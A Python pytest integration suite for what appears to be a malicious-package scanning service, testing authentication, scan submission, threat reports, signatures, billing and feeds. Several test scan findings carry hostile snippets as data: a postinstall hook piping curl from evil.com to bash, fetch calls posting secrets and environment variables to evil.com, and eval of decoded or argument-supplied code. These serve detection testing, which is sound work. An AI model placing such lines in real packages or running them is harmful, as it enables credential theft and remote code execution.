"""
Comprehensive Integration Testing Suite

Tests end-to-end workflows, database operations, external API integrations,
authentication flows, and cross-service communication.
"""

from __future__ import annotations

from uuid import uuid4

import pytest
from fastapi.testclient import TestClient

from database import db


class TestAuthenticationIntegration:
    """Test complete authentication workflows."""

    def test_complete_registration_login_flow(self, client: TestClient):
        """Test complete user registration and login flow."""
        # Step 1: Register new user
        user_data = {
            "email": f"integration-{uuid4().hex[:8]}@test.com",
            "password": "IntegrationTest123!",
            "name": "Integration Test User",
        }

        register_resp = client.post("/v1/auth/register", json=user_data)
        assert register_resp.status_code == 201, (
            f"Registration failed: {register_resp.text}"
        )

        register_data = register_resp.json()
        assert "access_token" in register_data
        assert "refresh_token" in register_data
        assert register_data["user"]["email"] == user_data["email"]

        initial_token = register_data["access_token"]
        refresh_token = register_data["refresh_token"]

        # Step 2: Use access token to get user profile
        headers = {"Authorization": f"Bearer {initial_token}"}
        me_resp = client.get("/v1/auth/me", headers=headers)
        assert me_resp.status_code == 200

        profile_data = me_resp.json()
        assert profile_data["email"] == user_data["email"]
        assert profile_data["name"] == user_data["name"]

        # Step 3: Login with credentials
        login_data = {
            "email": user_data["email"],
            "password": user_data["password"],
        }

        login_resp = client.post("/v1/auth/login", json=login_data)
        assert login_resp.status_code == 200

        login_response = login_resp.json()
        assert "access_token" in login_response
        assert "refresh_token" in login_response

        # Step 4: Use new token to access protected endpoint
        new_headers = {"Authorization": f"Bearer {login_response['access_token']}"}
        protected_resp = client.get("/v1/auth/me", headers=new_headers)
        assert protected_resp.status_code == 200

        # Step 5: Refresh token flow
        refresh_resp = client.post(
            "/v1/auth/refresh", json={"refresh_token": refresh_token}
        )
        assert refresh_resp.status_code == 200

        refresh_data = refresh_resp.json()
        assert "access_token" in refresh_data

        # Step 6: Logout
        logout_resp = client.post("/v1/auth/logout", headers=new_headers)
        assert logout_resp.status_code == 204

        # Step 7: Verify token is invalidated (optional, depends on implementation)
        client.get("/v1/auth/me", headers=new_headers)
        # Token might still work until expiry depending on stateless JWT implementation

    def test_password_validation_integration(self, client: TestClient):
        """Test password validation across the entire flow."""
        weak_passwords = [
            "weak",
            "12345678",
            "password",
            "NoNumbers",
            "nonumbers123",
            "NOLOWERCASE123",
        ]

        for weak_password in weak_passwords:
            user_data = {
                "email": f"weak-{uuid4().hex[:8]}@test.com",
                "password": weak_password,
                "name": "Weak Password Test",
            }

            resp = client.post("/v1/auth/register", json=user_data)
            assert resp.status_code == 422, (
                f"Weak password '{weak_password}' was accepted"
            )

            error_data = resp.json()
            assert "password" in str(error_data).lower()

    def test_email_uniqueness_integration(self, client: TestClient):
        """Test email uniqueness constraint integration."""
        user_data = {
            "email": f"unique-{uuid4().hex[:8]}@test.com",
            "password": "UniqueTest123!",
            "name": "Unique Email Test",
        }

        # First registration should succeed
        resp1 = client.post("/v1/auth/register", json=user_data)
        assert resp1.status_code == 201

        # Second registration with same email should fail
        resp2 = client.post("/v1/auth/register", json=user_data)
        assert resp2.status_code == 422

        error_data = resp2.json()
        assert "email" in str(error_data).lower()


class TestScanWorkflowIntegration:
    """Test complete scan submission and processing workflows."""

    def test_complete_scan_lifecycle(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test complete scan from submission to result retrieval."""
        # Step 1: Submit scan with findings
        scan_data = {
            "target": f"integration-test-{uuid4().hex[:8]}",
            "target_type": "npm",
            "files_scanned": 25,
            "findings": [
                {
                    "phase": "install_hooks",
                    "rule": "install-npm-postinstall",
                    "severity": "CRITICAL",
                    "file": "package.json",
                    "line": 15,
                    "snippet": '"postinstall": "curl evil.com | bash"',
                    "weight": 1.0,
                },
                {
                    "phase": "code_patterns",
                    "rule": "code-eval",
                    "severity": "HIGH",
                    "file": "index.js",
                    "line": 42,
                    "snippet": "eval(process.argv[2])",
                    "weight": 1.0,
                },
                {
                    "phase": "network_exfil",
                    "rule": "net-webhook",
                    "severity": "HIGH",
                    "file": "app.js",
                    "line": 100,
                    "snippet": "fetch('https://evil.com/steal', {method: 'POST', body: secrets})",
                    "weight": 1.0,
                },
            ],
            "metadata": {
                "version": "1.2.3",
                "author": "suspicious-author",
                "description": "Test package for integration testing",
            },
        }

        submit_resp = client.post("/v1/scans", json=scan_data, headers=auth_headers)
        assert submit_resp.status_code == 201, (
            f"Scan submission failed: {submit_resp.text}"
        )

        scan_response = submit_resp.json()
        assert "id" in scan_response
        assert scan_response["target"] == scan_data["target"]
        assert scan_response["classification"] in ["MALICIOUS", "SUSPICIOUS", "RISKY"]
        assert scan_response["score"] > 0

        scan_id = scan_response["id"]

        # Step 2: Retrieve scan by ID
        get_resp = client.get(f"/v1/scans/{scan_id}", headers=auth_headers)
        assert get_resp.status_code == 200

        retrieved_scan = get_resp.json()
        assert retrieved_scan["id"] == scan_id
        assert retrieved_scan["target"] == scan_data["target"]
        assert len(retrieved_scan["findings"]) == 3

        # Step 3: List user's scans
        list_resp = client.get("/v1/scans", headers=auth_headers)
        assert list_resp.status_code == 200

        scans_list = list_resp.json()
        assert "scans" in scans_list or isinstance(scans_list, list)

        # Find our scan in the list
        if "scans" in scans_list:
            scan_found = any(s["id"] == scan_id for s in scans_list["scans"])
        else:
            scan_found = any(s["id"] == scan_id for s in scans_list)
        assert scan_found, "Submitted scan not found in user's scan list"

        # Step 4: Check threat intelligence integration
        package_hash = scan_response.get("package_hash")
        if package_hash:
            threat_resp = client.get(f"/v1/threat/{package_hash}", headers=auth_headers)
            # Threat lookup might return 404 for new packages, which is acceptable
            assert threat_resp.status_code in [200, 404]

    def test_clean_scan_workflow(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test workflow for clean scans with no findings."""
        clean_scan_data = {
            "target": f"clean-package-{uuid4().hex[:8]}",
            "target_type": "pip",
            "files_scanned": 10,
            "findings": [],  # No security findings
            "metadata": {
                "version": "2.1.0",
                "author": "trusted-developer",
            },
        }

        resp = client.post("/v1/scans", json=clean_scan_data, headers=auth_headers)
        assert resp.status_code == 201

        scan_response = resp.json()
        assert scan_response["classification"] == "CLEAN"
        assert scan_response["score"] == 0.0
        assert scan_response["target"] == clean_scan_data["target"]

    def test_large_scan_integration(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test integration with large scan datasets."""
        # Create a scan with many findings
        large_findings = []
        for i in range(100):
            large_findings.append(
                {
                    "phase": "code_patterns",
                    "rule": f"test-rule-{i % 10}",
                    "severity": "MEDIUM",
                    "file": f"src/file_{i}.js",
                    "line": i + 1,
                    "snippet": f"suspicious_function_{i}(user_input)",
                    "weight": 0.5,
                }
            )

        large_scan_data = {
            "target": f"large-package-{uuid4().hex[:8]}",
            "target_type": "npm",
            "files_scanned": 100,
            "findings": large_findings,
            "metadata": {"version": "3.0.0"},
        }

        resp = client.post("/v1/scans", json=large_scan_data, headers=auth_headers)
        assert resp.status_code == 201

        scan_response = resp.json()
        assert scan_response["classification"] in ["SUSPICIOUS", "RISKY", "MALICIOUS"]
        assert len(scan_response["findings"]) == 100


class TestThreatIntelligenceIntegration:
    """Test threat intelligence system integration."""

    def test_threat_report_to_lookup_integration(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test threat reporting and subsequent lookup integration."""
        # Step 1: Submit a threat report
        threat_report_data = {
            "threat_type": "malware",
            "package_name": f"malicious-pkg-{uuid4().hex[:8]}",
            "package_version": "1.0.0",
            "package_hash": f"abc123def456{uuid4().hex[:8]}",
            "description": "Integration test malware package",
            "evidence": {
                "malicious_files": ["evil.js", "backdoor.py"],
                "indicators": ["connects to evil.com", "steals environment variables"],
            },
            "severity": "HIGH",
        }

        report_resp = client.post(
            "/v1/report", json=threat_report_data, headers=auth_headers
        )
        assert report_resp.status_code == 201

        report_response = report_resp.json()
        assert "id" in report_response
        assert report_response["package_name"] == threat_report_data["package_name"]

        # Step 2: Look up the reported threat
        package_hash = threat_report_data["package_hash"]
        lookup_resp = client.get(f"/v1/threat/{package_hash}", headers=auth_headers)

        if lookup_resp.status_code == 200:
            threat_data = lookup_resp.json()
            assert threat_data["package_name"] == threat_report_data["package_name"]
            assert threat_data["severity"] == threat_report_data["severity"]
        elif lookup_resp.status_code == 404:
            # Acceptable if threat intel is not immediately available
            pass
        else:
            pytest.fail(f"Unexpected threat lookup response: {lookup_resp.status_code}")

    def test_signature_management_integration(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test signature creation and detection integration."""
        # Step 1: Create a custom signature
        signature_data = {
            "name": f"integration-test-sig-{uuid4().hex[:8]}",
            "pattern": r"dangerous_function\s*\([^)]*\)",
            "severity": "HIGH",
            "phase": "code_patterns",
            "description": "Integration test signature",
            "enabled": True,
        }

        sig_resp = client.post(
            "/v1/signatures", json=signature_data, headers=auth_headers
        )

        if sig_resp.status_code == 201:
            # Step 2: Submit a scan that should trigger this signature
            scan_data = {
                "target": f"signature-test-{uuid4().hex[:8]}",
                "target_type": "npm",
                "files_scanned": 5,
                "findings": [
                    {
                        "phase": "code_patterns",
                        "rule": signature_data["name"],
                        "severity": "HIGH",
                        "file": "malicious.js",
                        "line": 10,
                        "snippet": "dangerous_function(user_input)",
                        "weight": 1.0,
                    }
                ],
                "metadata": {"version": "1.0.0"},
            }

            scan_resp = client.post("/v1/scans", json=scan_data, headers=auth_headers)
            assert scan_resp.status_code == 201

            scan_response = scan_resp.json()
            assert scan_response["classification"] in [
                "SUSPICIOUS",
                "RISKY",
                "MALICIOUS",
            ]


class TestBillingIntegration:
    """Test billing and subscription integration (if enabled)."""

    def test_plan_upgrade_workflow(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test plan upgrade workflow integration."""
        # Step 1: Check current subscription
        sub_resp = client.get("/v1/billing/subscription", headers=auth_headers)

        if sub_resp.status_code == 200:
            current_sub = sub_resp.json()
            current_sub.get("plan", "free")

            # Step 2: List available plans
            plans_resp = client.get("/v1/billing/plans", headers=auth_headers)
            assert plans_resp.status_code == 200

            plans = plans_resp.json()
            assert "plans" in plans or isinstance(plans, list)

            # Step 3: Attempt subscription (this would normally redirect to Stripe)
            subscribe_data = {
                "plan": "pro",
                "success_url": "https://example.com/success",
                "cancel_url": "https://example.com/cancel",
            }

            subscribe_resp = client.post(
                "/v1/billing/subscribe", json=subscribe_data, headers=auth_headers
            )

            # Should return checkout session URL or handle appropriately
            assert subscribe_resp.status_code in [200, 201, 302]

    def test_billing_portal_integration(
        self, client: TestClient, pro_auth_headers: dict[str, str]
    ):
        """Test billing portal integration for existing subscribers."""
        portal_resp = client.post("/v1/billing/portal", headers=pro_auth_headers)

        # Should provide portal URL for managing subscription
        assert portal_resp.status_code in [200, 201]


class TestDatabaseIntegration:
    """Test database integration and data consistency."""

    @pytest.mark.asyncio
    async def test_user_data_consistency(self, client: TestClient):
        """Test user data consistency across operations."""
        # Create user via API
        user_data = {
            "email": f"db-test-{uuid4().hex[:8]}@test.com",
            "password": "DatabaseTest123!",
            "name": "Database Test User",
        }

        register_resp = client.post("/v1/auth/register", json=user_data)
        assert register_resp.status_code == 201

        api_user_data = register_resp.json()["user"]
        user_id = api_user_data["id"]

        # Verify user exists in database directly
        db_user = await db.get_user_by_id(user_id)
        assert db_user is not None
        assert db_user["email"] == user_data["email"]
        assert db_user["name"] == user_data["name"]

        # Verify email lookup works
        db_user_by_email = await db.get_user_by_email(user_data["email"])
        assert db_user_by_email is not None
        assert db_user_by_email["id"] == user_id

    @pytest.mark.asyncio
    async def test_scan_data_persistence(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test scan data persistence and retrieval."""
        # Submit scan via API
        scan_data = {
            "target": f"persistence-test-{uuid4().hex[:8]}",
            "target_type": "npm",
            "files_scanned": 15,
            "findings": [
                {
                    "phase": "code_patterns",
                    "rule": "persistence-test",
                    "severity": "HIGH",
                    "file": "test.js",
                    "line": 20,
                    "snippet": "test persistence",
                    "weight": 1.0,
                }
            ],
            "metadata": {"test": "persistence"},
        }

        submit_resp = client.post("/v1/scans", json=scan_data, headers=auth_headers)
        assert submit_resp.status_code == 201

        api_scan_data = submit_resp.json()
        scan_id = api_scan_data["id"]

        # Verify scan exists in database directly
        db_scan = await db.get_scan(scan_id)
        assert db_scan is not None
        assert db_scan["target"] == scan_data["target"]
        assert db_scan["target_type"] == scan_data["target_type"]

        # Verify findings are stored correctly
        db_findings = await db.get_scan_findings(scan_id)
        assert len(db_findings) == 1
        assert db_findings[0]["rule"] == "persistence-test"


class TestExternalAPIIntegration:
    """Test integration with external APIs and services."""

    def test_registry_lookup_integration(self, client: TestClient):
        """Test package registry lookup integration."""
        # Test public registry endpoints
        registry_resp = client.get("/registry/npm/lodash")

        # Should return package information or 404 if not scanned
        assert registry_resp.status_code in [200, 404]

        if registry_resp.status_code == 200:
            package_data = registry_resp.json()
            assert "package_name" in package_data
            assert "scan_results" in package_data or "scans" in package_data

    def test_badge_generation_integration(self, client: TestClient):
        """Test security badge generation integration."""
        # Test badge endpoint
        badge_resp = client.get("/badge/npm/example-package.svg")

        # Should return SVG badge or 404
        assert badge_resp.status_code in [200, 404]

        if badge_resp.status_code == 200:
            assert badge_resp.headers["content-type"] == "image/svg+xml"
            assert b"<svg" in badge_resp.content

    def test_feed_integration(self, client: TestClient):
        """Test threat intelligence feed integration."""
        # Test RSS feed
        rss_resp = client.get("/feed.rss")
        assert rss_resp.status_code == 200
        assert "xml" in rss_resp.headers["content-type"]

        # Test JSON feed
        json_resp = client.get("/feed.json")
        assert json_resp.status_code == 200
        assert json_resp.headers["content-type"] == "application/json"

        feed_data = json_resp.json()
        assert "version" in feed_data
        assert "items" in feed_data


class TestWorkflowIntegration:
    """Test complete end-to-end workflows."""

    def test_malware_detection_workflow(self, client: TestClient):
        """Test complete malware detection and reporting workflow."""
        # Step 1: Register security researcher
        researcher_data = {
            "email": f"researcher-{uuid4().hex[:8]}@security.org",
            "password": "ResearcherPass123!",
            "name": "Security Researcher",
        }

        register_resp = client.post("/v1/auth/register", json=researcher_data)
        assert register_resp.status_code == 201

        researcher_token = register_resp.json()["access_token"]
        researcher_headers = {"Authorization": f"Bearer {researcher_token}"}

        # Step 2: Submit malicious package scan
        malicious_scan = {
            "target": f"definitely-malware-{uuid4().hex[:8]}",
            "target_type": "npm",
            "files_scanned": 50,
            "findings": [
                {
                    "phase": "install_hooks",
                    "rule": "install-npm-postinstall",
                    "severity": "CRITICAL",
                    "file": "package.json",
                    "line": 8,
                    "snippet": '"postinstall": "node ./steal-secrets.js"',
                    "weight": 1.0,
                },
                {
                    "phase": "network_exfil",
                    "rule": "net-http-exfil",
                    "severity": "HIGH",
                    "file": "steal-secrets.js",
                    "line": 15,
                    "snippet": "fetch('http://evil.com/collect', {method: 'POST', body: JSON.stringify(process.env)})",
                    "weight": 1.0,
                },
                {
                    "phase": "obfuscation",
                    "rule": "obf-base64-decode",
                    "severity": "HIGH",
                    "file": "hidden.js",
                    "line": 1,
                    "snippet": "eval(atob('Y29uc29sZS5sb2coJ21hbGljaW91cycpOw=='))",
                    "weight": 1.0,
                },
            ],
            "metadata": {
                "version": "1.0.0",
                "author": "evil-actor",
                "npm_url": "https://www.npmjs.com/package/definitely-malware",
            },
        }

        scan_resp = client.post(
            "/v1/scans", json=malicious_scan, headers=researcher_headers
        )
        assert scan_resp.status_code == 201

        scan_result = scan_resp.json()
        assert scan_result["classification"] == "MALICIOUS"
        assert scan_result["score"] >= 8.0  # High score due to critical findings

        # Step 3: Submit threat report
        threat_data = {
            "threat_type": "malware",
            "package_name": malicious_scan["target"],
            "package_version": "1.0.0",
            "package_hash": scan_result.get("package_hash", f"hash-{uuid4().hex}"),
            "description": "NPM package with credential stealing capabilities",
            "evidence": {
                "scan_id": scan_result["id"],
                "install_hook": True,
                "data_exfiltration": True,
                "code_obfuscation": True,
            },
            "severity": "CRITICAL",
        }

        report_resp = client.post(
            "/v1/report", json=threat_data, headers=researcher_headers
        )
        assert report_resp.status_code == 201

        # Step 4: Check that package appears in threat feed
        feed_resp = client.get("/feed.json")
        assert feed_resp.status_code == 200

        feed_data = feed_resp.json()
        # Package might not immediately appear in feed, so we'll just verify feed format
        assert "items" in feed_data

    def test_developer_verification_workflow(self, client: TestClient):
        """Test legitimate developer package verification workflow."""
        # Step 1: Register legitimate developer
        dev_data = {
            "email": f"developer-{uuid4().hex[:8]}@company.com",
            "password": "DeveloperPass123!",
            "name": "Legitimate Developer",
        }

        register_resp = client.post("/v1/auth/register", json=dev_data)
        assert register_resp.status_code == 201

        dev_token = register_resp.json()["access_token"]
        dev_headers = {"Authorization": f"Bearer {dev_token}"}

        # Step 2: Submit clean package scan
        clean_scan = {
            "target": f"my-awesome-lib-{uuid4().hex[:8]}",
            "target_type": "npm",
            "files_scanned": 25,
            "findings": [],  # Clean package
            "metadata": {
                "version": "2.1.0",
                "author": "Legitimate Developer",
                "npm_url": "https://www.npmjs.com/package/my-awesome-lib",
                "repository": "https://github.com/legit-dev/my-awesome-lib",
            },
        }

        scan_resp = client.post("/v1/scans", json=clean_scan, headers=dev_headers)
        assert scan_resp.status_code == 201

        scan_result = scan_resp.json()
        assert scan_result["classification"] == "CLEAN"
        assert scan_result["score"] == 0.0

        # Step 3: Request package verification
        verify_data = {
            "package_name": clean_scan["target"],
            "package_version": "2.1.0",
            "publisher": "Legitimate Developer",
            "registry_url": "https://registry.npmjs.org/",
        }

        verify_resp = client.post("/v1/verify", json=verify_data, headers=dev_headers)
        assert verify_resp.status_code in [200, 201]

        # Step 4: Check public registry entry
        registry_resp = client.get(f"/registry/npm/{clean_scan['target']}")

        if registry_resp.status_code == 200:
            package_info = registry_resp.json()
            assert package_info["package_name"] == clean_scan["target"]
            assert package_info["status"] in ["clean", "verified"]


class TestErrorHandlingIntegration:
    """Test error handling and recovery in integrated workflows."""

    def test_database_error_recovery(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test API behavior when database operations fail."""
        # This test would normally involve mocking database failures
        # For now, we test edge cases that might cause database issues

        # Test with extremely large payloads that might timeout
        oversized_findings = []
        for i in range(1000):  # Very large number of findings
            oversized_findings.append(
                {
                    "phase": "code_patterns",
                    "rule": f"rule-{i}",
                    "severity": "LOW",
                    "file": f"file-{i}.js",
                    "line": i,
                    "snippet": "x" * 500,  # Large snippet
                    "weight": 0.1,
                }
            )

        oversized_scan = {
            "target": "oversized-test",
            "target_type": "npm",
            "files_scanned": 1000,
            "findings": oversized_findings,
            "metadata": {},
        }

        resp = client.post("/v1/scans", json=oversized_scan, headers=auth_headers)

        # Should handle gracefully - either accept with timeout protection or reject
        assert resp.status_code in [201, 413, 422, 500, 503]

    def test_authentication_error_integration(self, client: TestClient):
        """Test authentication error handling across workflows."""
        # Test with expired/invalid token
        invalid_headers = {"Authorization": "Bearer invalid.token.here"}

        # All protected endpoints should consistently return 401
        protected_endpoints = [
            ("GET", "/v1/auth/me"),
            ("GET", "/v1/scans"),
            ("POST", "/v1/scans"),
            ("POST", "/v1/report"),
            ("GET", "/v1/billing/subscription"),
        ]

        for method, endpoint in protected_endpoints:
            if method == "GET":
                resp = client.get(endpoint, headers=invalid_headers)
            elif method == "POST":
                resp = client.post(endpoint, json={}, headers=invalid_headers)

            assert resp.status_code == 401, (
                f"{method} {endpoint} didn't return 401 for invalid token"
            )

    def test_rate_limit_integration(self, client: TestClient):
        """Test rate limiting across different endpoints."""
        # Make rapid requests to test rate limiting
        responses = []

        for i in range(300):  # Exceed rate limits
            resp = client.get("/health")
            responses.append(resp.status_code)

            if any(sc == 429 for sc in responses):
                break  # Rate limit triggered

        # Should eventually get rate limited
        rate_limited = any(sc == 429 for sc in responses)
        assert rate_limited or len(responses) == 300, (
            "Rate limiting not properly configured"
        )
